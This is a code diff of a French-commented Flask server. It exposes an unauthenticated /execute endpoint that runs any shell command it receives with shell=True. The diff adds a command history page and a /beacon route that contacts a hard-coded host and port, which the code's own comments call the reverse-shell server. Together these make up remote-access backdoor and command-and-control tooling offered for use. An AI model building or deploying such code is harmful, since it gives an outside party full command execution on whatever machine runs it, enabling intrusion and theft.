@@ -1,15 +1,18 @@
-from flask import Flask, request, jsonify # type: ignore
+from flask import Flask, request, jsonify, render_template
 import subprocess
 import os
 import threading
+import socket
 
-# Création de l'application Flask
 app = Flask(__name__)
 PORT = 3000
+SERVER_IP = "192.168.1.100"  # Adresse IP pour le reverse shell
+SERVER_PORT = 9999          # Port pour la communication du reverse shell
 
+# Liste pour stocker l'historique des commandes
+command_history = []
 
-
-# Gestionnaire d'événements pour les commandes
+# Classe CommandEvent pour gérer les événements de commande
 class CommandEvent:
     def __init__(self):
         self.subscribers = []
@@ -22,8 +25,9 @@ class CommandEvent:
             callback(command)
 
 command_event = CommandEvent()
+
 # Route POST pour exécuter des commandes shell
-@app.route('/execute', methods=['ANY'])
+@app.route('/execute', methods=['POST'])
 def execute_command():
     data = request.get_json()
         
@@ -32,66 +36,36 @@ def execute_command():
 
     command = data["command"]
 
+    # Ajout de la commande à l'historique
+    command_history.append(command)
+
     # Émission de l'événement pour la commande
     threading.Thread(target=command_event.emit, args=(command,)).start()
 
-    # Exécution de la commande shell
     try:
         result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True, cwd=os.getcwd())
         return jsonify({"output": result.stdout})
     except subprocess.CalledProcessError as e:
         return jsonify({"error": e.stderr}), 500
 
-# Route GET pour la racine "/"
-@app.route('/')
-def home():
-    background = os.path.join(os.getcwd(), "bgManageD3.png")
-    return """
-    <!DOCTYPE html>
-    <html lang="fr">
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>API Serveur</title>
-        <style>
-            body {
-                font-family: Arial, sans-serif;
-                background-color: #f4f4f4;
-                margin: 0;
-                padding: 0;
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                height: 100vh;
-                background-image: url('""" + background + """');
-            }
-            .container {
-                text-align: center;
-                background: #fff;
-                padding: 20px;
-                border-radius: 8px;
-                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            }
-            h1 {
-                color: #333;
-            }
-            p {
-                color: #666;
-            }
-        </style>
-    </head>
-    <body>
-        <div class="container">
-            <h1>Bienvenue sur l'API Serveur</h1>
-            <p>Utilisez l'endpoint <code>/execute</code> pour exécuter des commandes shell.</p>
-        </div>
-    </body>
-    </html>
-    """
+# Route pour récupérer l'état de la communication (beacon)
+@app.route('/beacon', methods=['GET'])
+def beacon():
+    # Implémentation de la demande pour vérifier si des actions doivent être exécutées
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((SERVER_IP, SERVER_PORT))
+        s.sendall(b"BEACON")
+        data = s.recv(1024)
+        return jsonify({"message": data.decode()})
 
-# Listener pour capturer les commandes exécutées
+# Route pour afficher l'historique des commandes exécutées
+@app.route('/history', methods=['GET'])
+def history():
+    return render_template('history.html', command_history=command_history)
+
+# Listener pour log des commandes exécutées
 def log_command(command):
-    print(f"Nouvelle commande exécutée : {command}")
+    print(f"Commande reçue : {command}")
 
 command_event.subscribe(log_command)
 
